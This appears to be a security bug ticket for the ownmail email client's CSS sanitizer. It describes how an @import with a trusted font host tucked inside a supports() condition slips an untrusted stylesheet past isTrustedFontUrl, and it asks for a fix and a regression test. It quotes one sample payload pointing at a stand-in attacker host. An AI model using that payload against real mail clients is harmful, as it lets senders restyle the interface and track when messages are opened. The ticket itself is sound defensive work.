---
id: TASK-132
title: Check font import targets against trusted font hosts
status: To Do
assignee: []
created_date: '2026-10-10 05:32'
labels:
  - security
dependencies: []
references:
  - ownmail/sanitizer/worker.js
  - tests/test_sanitizer.py
priority: medium
type: bug
ordinal: 9880
---

## Description

<!-- SECTION:DESCRIPTION:BEGIN -->
scopeAndSanitizeCSS (ownmail/sanitizer/worker.js) keeps an @import only when isTrustedFontUrl approves its prelude. isTrustedFontUrl checks the first url() token anywhere in the prelude and falls back to the first quoted string, so a url() inside a supports() condition is checked instead of the import target. The worker keeps this rule with the untrusted target intact:

```css
@import "https://attacker.invalid/style.css" supports(background: url("https://<host in TRUSTED_FONT_HOSTS>/"));
```

While remote content is blocked, IMAGE_BLOCKING_CSP refuses the stylesheet and _css_has_remote_urls still offers the remote-content prompt. Once remote content is loaded or the sender is trusted, a stylesheet from any host loads. It is not scoped to the message, so it can restyle application UI, and its fetch tells the remote host the message was opened. MESSAGE_CSP still blocks scripts.

Check the import target itself: take the first prelude component (a url() or a string) and require a TRUSTED_FONT_HOSTS host. A url() in a supports(), layer() or media condition must never satisfy the check.
<!-- SECTION:DESCRIPTION:END -->

## Acceptance Criteria
<!-- AC:BEGIN -->
- [ ] #1 An @import is kept only when its target, the first prelude component, is a url() or string naming a TRUSTED_FONT_HOSTS host; a url() in a supports(), layer() or media condition never satisfies the check.
- [ ] #2 Trusted imports in url() and quoted-string form, with or without a media query, are still kept, and untrusted targets are still removed.
- [ ] #3 A test_sanitizer regression with the synthetic supports() import above fails against the current isTrustedFontUrl and passes after the fix.
- [ ] #4 The full pre-push gate passes.
<!-- AC:END -->
